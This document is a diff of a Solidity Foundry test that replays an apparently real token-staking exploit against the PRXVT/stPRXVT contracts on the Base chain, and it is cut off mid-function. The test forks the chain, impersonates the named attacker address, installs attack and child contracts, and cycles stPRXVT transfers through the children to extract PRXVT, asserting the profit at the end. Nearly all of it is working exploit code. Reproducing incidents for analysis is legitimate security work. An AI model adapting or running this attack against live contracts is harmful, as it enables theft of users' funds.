@@ -8,8 +8,8 @@ import "./Base.sol";
 // Attacker : 0x7407f9bdc4140d5e284ea7de32a9de6037842f45
 // Attack Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
 // Vulnerable Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
-// Attack Tx : 0x88610208c00f5d5ca234e45205a01199c87cb859f881e8b35297cba8325a5494
-// Block : 40230828
+// Attack Tx : 0xf42a8fe556d5e4ab59b0b7675ccbcd1425e7e2a6a8e0c9775fc6cd7c48ff55a1
+// Block : 40230107
 // Chain : Base
 // Analysis :
 //
@@ -24,70 +24,91 @@ import "./Base.sol";
 contract AttackTest is Base {
     address constant ATTACKER_EOA = Addresses.attacker_eoa;
     address constant ATTACK_CONTRACT = Addresses.attack_contract;
-    uint256 constant FORK_BLOCK = 40230827;
-    uint256 constant TX_TIMESTAMP = 1767251003;
-    uint256 constant TX_BLOCK_NUMBER = 40230828;
+    uint256 constant FORK_BLOCK = 40230106;
+    uint256 constant TX_TIMESTAMP = 1767249561;
+    uint256 constant TX_BLOCK_NUMBER = 40230107;
     uint256 constant TX_VALUE = 0;
 
     function setUp() public {
-        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
+        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
         if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
         if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
     }
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-        OurAttack attack = _deployAttack();
-        _prepareProfit(address(attack), Addresses.attack_child);
+        OurAttack attack = _deployAttackContrac();
+        _prepareProfit(attack);
         _logBalances("Before exploit");
-        attack.attack{value: TX_VALUE}();
+        bytes memory entryData = abi.encodeWithSelector(
+            bytes4(0xe6d7db7e), uint256(0x00000000000000000000000000000000000000000000000000000000000927c0)
+        );
+        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
+        if (!ok) assembly { revert(add(result, 32), mload(result)) }
         _logBalances("After exploit");
         vm.stopPrank();
         _assertProfit();
     }
 
-    function _deployAttack() internal returns (OurAttack attack) {
+    function _deployAttackContrac() internal returns (OurAttack attack) {
         if (ATTACK_CONTRACT != address(0)) {
-            _etchAttackRuntime();
+            _installRuntimeFallb();
             attack = OurAttack(payable(ATTACK_CONTRACT));
         } else {
             attack = new OurAttack();
         }
-        _etchChildRuntimes();
-        attack.bindAttackChildContracts();
+        _installAttackChildR();
+        _bindAttackAttackChi(attack);
     }
 
-    function _etchAttackRuntime() internal {
+    function _prepareProfit(OurAttack attack) internal {
+        _prepareProfit(address(attack), _expectedAttackChild(attack));
+    }
+
+    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
+        attack;
+        return Addresses.attack_child;
+    }
+
+    function _installRuntimeFallb() internal {
+        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
         vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
     }
 
-    function _etchChildRuntimes() internal {
+    function _installAttackChildR() internal {
+        // Exact-address fallback for attack child contracts that were dynamically created in the trace.
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child constructor=0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_F8F4, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_8754, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_4327, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_6E05, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_41C0, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_EA60, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_7225, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_1083, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_A3C8, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_69A9, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_82C9, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_002A, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_AF0E, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_C97F, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_1651, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_9CAE, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_CFF2, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_87FE, type(AttackChild).runtimeCode);
-        vm.etch(Addresses.attack_child_410C, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_21A6 constructor=0x10318e391ba9dfb517f7d0f521bf2691d32821a6|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_21A6, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_7D8E constructor=0x19ceebdd5838c60e73d7557f8950da0ed0457d8e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_7D8E, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_F368 constructor=0x25c9ca5e593553c696ebb09ed675b0f09b5ef368|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_F368, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_38A8 constructor=0x72cdff23db035d4959901158d230c0c8642a38a8|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_38A8, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_8466 constructor=0x8d7bf27794b53129a143b120b1852fe3048e8466|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_8466, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_960D constructor=0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_960D, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_5349 constructor=0x9ff99efad40cd6ff67d7552bbec5434653fa5349|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_5349, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_B5EB constructor=0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_B5EB, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_BD4E constructor=0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_BD4E, type(AttackChild).runtimeCode);
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=Addresses.attack_child_F4AD constructor=0xea6e0b9f162e5532389f32832529a794bf10f4ad|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+        vm.etch(Addresses.attack_child_F4AD, type(AttackChild).runtimeCode);
+    }
+
+    function _bindAttackAttackChi(OurAttack attack) internal {
+        attack.bindAttackChildContracts();
     }
 
     function _expectProfitLegs(address attack, address attackChild) internal override {
         attack;
         attackChild;
-        _expectProfit(Addresses.attack_contract, attack, Addresses.PRXVT, "PRXVT", 206765939449912147200000);
+        _expectProfit(Addresses.attack_contract, attack, Addresses.PRXVT, "PRXVT", 1968873386914157328000);
     }
 }
 
@@ -104,179 +125,640 @@ contract OurAttack {
     AttackChild public attackChild_8;
     AttackChild public attackChild_9;
     AttackChild public attackChild_10;
-    AttackChild public attackChild_11;
-    AttackChild public attackChild_12;
-    AttackChild public attackChild_13;
-    AttackChild public attackChild_14;
-    AttackChild public attackChild_15;
-    AttackChild public attackChild_16;
-    AttackChild public attackChild_17;
-    AttackChild public attackChild_18;
-    AttackChild public attackChild_19;
 
     function deployAttackChildContracts() external returns (address) {
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild) constructor=0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild) == address(0)) {
-            attackChild = AttackChild(payable(0x04021252a55fd6E012f96350EB28820FD2f01048));
+            attackChild = AttackChild(payable(0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_1) constructor=0x10318e391ba9dfb517f7d0f521bf2691d32821a6|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_1) == address(0)) {
-            attackChild_1 = AttackChild(payable(0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4));
+            attackChild_1 = AttackChild(payable(0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_2) constructor=0x19ceebdd5838c60e73d7557f8950da0ed0457d8e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_2) == address(0)) {
-            attackChild_2 = AttackChild(payable(0x1915e1d705A16fb0555183d8035A40B4D7b08754));
+            attackChild_2 = AttackChild(payable(0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_3) constructor=0x25c9ca5e593553c696ebb09ed675b0f09b5ef368|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_3) == address(0)) {
-            attackChild_3 = AttackChild(payable(0x34659264a5772fB78328BC2458aFA602De0c4327));
+            attackChild_3 = AttackChild(payable(0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_4) constructor=0x72cdff23db035d4959901158d230c0c8642a38a8|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_4) == address(0)) {
-            attackChild_4 = AttackChild(payable(0x3731aB4Bf5411E83f0284e977cC957C470b06E05));
+            attackChild_4 = AttackChild(payable(0x72CDfF23dB035D4959901158d230c0c8642a38a8));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_5) constructor=0x8d7bf27794b53129a143b120b1852fe3048e8466|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_5) == address(0)) {
-            attackChild_5 = AttackChild(payable(0x4Ae6813D2303389b4eE340a4203018b7D55A41C0));
+            attackChild_5 = AttackChild(payable(0x8D7bf27794B53129a143b120B1852Fe3048E8466));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_6) constructor=0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_6) == address(0)) {
-            attackChild_6 = AttackChild(payable(0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60));
+            attackChild_6 = AttackChild(payable(0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_7) constructor=0x9ff99efad40cd6ff67d7552bbec5434653fa5349|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_7) == address(0)) {
-            attackChild_7 = AttackChild(payable(0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225));
+            attackChild_7 = AttackChild(payable(0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_8) constructor=0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_8) == address(0)) {
-            attackChild_8 = AttackChild(payable(0x67588894D086634BD399F8bC6A8e98399B841083));
+            attackChild_8 = AttackChild(payable(0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_9) constructor=0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_9) == address(0)) {
-            attackChild_9 = AttackChild(payable(0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8));
+            attackChild_9 = AttackChild(payable(0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E));
         }
+        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_10) constructor=0xea6e0b9f162e5532389f32832529a794bf10f4ad|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
         if (address(attackChild_10) == address(0)) {
-            attackChild_10 = AttackChild(payable(0x83fEF8e277Ae519B6cCB247771704b72679769A9));
-        }
-        if (address(attackChild_11) == address(0)) {
-            attackChild_11 = AttackChild(payable(0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9));
-        }
-        if (address(attackChild_12) == address(0)) {
-            attackChild_12 = AttackChild(payable(0x8f328440FEa42b3f5c19eF267b308D928171002A));
-        }
-        if (address(attackChild_13) == address(0)) {
-            attackChild_13 = AttackChild(payable(0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e));
-        }
-        if (address(attackChild_14) == address(0)) {
-            attackChild_14 = AttackChild(payable(0xB43d98418c5A5863f1a96c2917164d074ff4c97f));
-        }
-        if (address(attackChild_15) == address(0)) {
-            attackChild_15 = AttackChild(payable(0xbB565626B6107542A07235DaC741082a9A3e1651));
-        }
-        if (address(attackChild_16) == address(0)) {
-            attackChild_16 = AttackChild(payable(0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae));
-        }
-        if (address(attackChild_17) == address(0)) {
-            attackChild_17 = AttackChild(payable(0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2));
-        }
-        if (address(attackChild_18) == address(0)) {
-            attackChild_18 = AttackChild(payable(0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE));
-        }
-        if (address(attackChild_19) == address(0)) {
-            attackChild_19 = AttackChild(payable(0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c));
+            attackChild_10 = AttackChild(payable(0xEA6E0B9f162E5532389f32832529a794bf10F4AD));
         }
         return address(attackChild);
     }
 
     function attack() external payable {
         if (address(attackChild) == address(0)) {
-            attackChild = AttackChild(payable(0x04021252a55fd6E012f96350EB28820FD2f01048));
-            attackChild_1 = AttackChild(payable(0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4));
-            attackChild_2 = AttackChild(payable(0x1915e1d705A16fb0555183d8035A40B4D7b08754));
-            attackChild_3 = AttackChild(payable(0x34659264a5772fB78328BC2458aFA602De0c4327));
-            attackChild_4 = AttackChild(payable(0x3731aB4Bf5411E83f0284e977cC957C470b06E05));
-            attackChild_5 = AttackChild(payable(0x4Ae6813D2303389b4eE340a4203018b7D55A41C0));
-            attackChild_6 = AttackChild(payable(0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60));
-            attackChild_7 = AttackChild(payable(0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225));
-            attackChild_8 = AttackChild(payable(0x67588894D086634BD399F8bC6A8e98399B841083));
-            attackChild_9 = AttackChild(payable(0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8));
-            attackChild_10 = AttackChild(payable(0x83fEF8e277Ae519B6cCB247771704b72679769A9));
-            attackChild_11 = AttackChild(payable(0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9));
-            attackChild_12 = AttackChild(payable(0x8f328440FEa42b3f5c19eF267b308D928171002A));
-            attackChild_13 = AttackChild(payable(0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e));
-            attackChild_14 = AttackChild(payable(0xB43d98418c5A5863f1a96c2917164d074ff4c97f));
-            attackChild_15 = AttackChild(payable(0xbB565626B6107542A07235DaC741082a9A3e1651));
-            attackChild_16 = AttackChild(payable(0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae));
-            attackChild_17 = AttackChild(payable(0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2));
-            attackChild_18 = AttackChild(payable(0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE));
-            attackChild_19 = AttackChild(payable(0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c));
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild) constructor=0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild) == address(0)) {
+                attackChild = AttackChild(payable(0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_1) constructor=0x10318e391ba9dfb517f7d0f521bf2691d32821a6|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_1) == address(0)) {
+                attackChild_1 = AttackChild(payable(0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_2) constructor=0x19ceebdd5838c60e73d7557f8950da0ed0457d8e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_2) == address(0)) {
+                attackChild_2 = AttackChild(payable(0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_3) constructor=0x25c9ca5e593553c696ebb09ed675b0f09b5ef368|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_3) == address(0)) {
+                attackChild_3 = AttackChild(payable(0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_4) constructor=0x72cdff23db035d4959901158d230c0c8642a38a8|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_4) == address(0)) {
+                attackChild_4 = AttackChild(payable(0x72CDfF23dB035D4959901158d230c0c8642a38a8));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_5) constructor=0x8d7bf27794b53129a143b120b1852fe3048e8466|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_5) == address(0)) {
+                attackChild_5 = AttackChild(payable(0x8D7bf27794B53129a143b120B1852Fe3048E8466));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_6) constructor=0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_6) == address(0)) {
+                attackChild_6 = AttackChild(payable(0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_7) constructor=0x9ff99efad40cd6ff67d7552bbec5434653fa5349|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_7) == address(0)) {
+                attackChild_7 = AttackChild(payable(0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_8) constructor=0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_8) == address(0)) {
+                attackChild_8 = AttackChild(payable(0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_9) constructor=0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_9) == address(0)) {
+                attackChild_9 = AttackChild(payable(0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E));
+            }
+            // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create2 address=address(attackChild_10) constructor=0xea6e0b9f162e5532389f32832529a794bf10f4ad|entry|entry|len:1469|input:8e1d9144fd9db3db|ct:CREATE2|dynamic_instantiation runtime_selectors=1 initcode_sha256=0x8e1d9144fd9db3dbfce093068b243a25f26c7555f94fa20c19f742a43ea64959 fallback_reasons=none
+            if (address(attackChild_10) == address(0)) {
+                attackChild_10 = AttackChild(payable(0xEA6E0B9f162E5532389f32832529a794bf10F4AD));
+            }
         }
-        _runStakeCycle(attackChild_2, 3);
-        _runStakeCycle(attackChild_19, 20);
-        _runStakeCycle(attackChild_11, 12);
-        _runStakeCycle(attackChild_6, 7);
-        _runStakeCycle(attackChild_3, 4);
-        _runStakeCycle(attackChild_9, 10);
-        _runStakeCycle(attackChild_16, 17);
-        _runStakeCycle(attackChild_1, 2);
-        _runStakeCycle(attackChild_5, 6);
-        _runStakeCycle(attackChild_13, 14);
-        _runStakeCycle(attackChild_4, 5);
-        _runStakeCycle(attackChild_17, 18);
-        _runStakeCycle(attackChild_15, 16);
-        _runStakeCycle(attackChild_18, 19);
-        _runStakeCycle(attackChild_7, 8);
-        _runStakeCycle(attackChild_12, 13);
-        _runStakeCycle(attackChild_8, 9);
-        _runStakeCycle(attackChild_10, 11);
-        _runStakeCycle(attackChild_14, 15);
-        _runStakeCycle(attackChild, 1);
-    }
-
-    function _executeStakeCycles() internal {
-        _runStakeCycle(attackChild_2, 3);
-        _runStakeCycle(attackChild_19, 20);
-        _runStakeCycle(attackChild_11, 12);
-        _runStakeCycle(attackChild_6, 7);
-        _runStakeCycle(attackChild_3, 4);
-        _runStakeCycle(attackChild_9, 10);
-        _runStakeCycle(attackChild_16, 17);
-        _runStakeCycle(attackChild_1, 2);
-        _runStakeCycle(attackChild_5, 6);
-        _runStakeCycle(attackChild_13, 14);
-        _runStakeCycle(attackChild_4, 5);
-        _runStakeCycle(attackChild_17, 18);
-        _runStakeCycle(attackChild_15, 16);
-        _runStakeCycle(attackChild_18, 19);
-        _runStakeCycle(attackChild_7, 8);
-        _runStakeCycle(attackChild_12, 13);
-        _runStakeCycle(attackChild_8, 9);
-        _runStakeCycle(attackChild_10, 11);
-        _runStakeCycle(attackChild_14, 15);
-        _runStakeCycle(attackChild, 1);
-    }
-
-    function _runStakeCycle(AttackChild child, uint256 cycle) internal {
+        _replayProtocolCalls();
+        _settleTokenFlows();
+        _replayProtocolCal6();
         IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
-        require(address(child).code.length != 0, "attack child runtime missing");
-        _prepareChild(child, cycle);
-        IERC20Like(Addresses.stPRXVT).transfer(address(child), 2300000000000000000000000);
-        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
-        child.execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
-        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(4));
+            observedSalt;
+            address created = address(attackChild_3);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_3)))._prepareAttackChild4();
+        {
+            uint256 transferActionGraphAmount_5 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_3), transferActionGraphAmount_5);
+        }
+        {
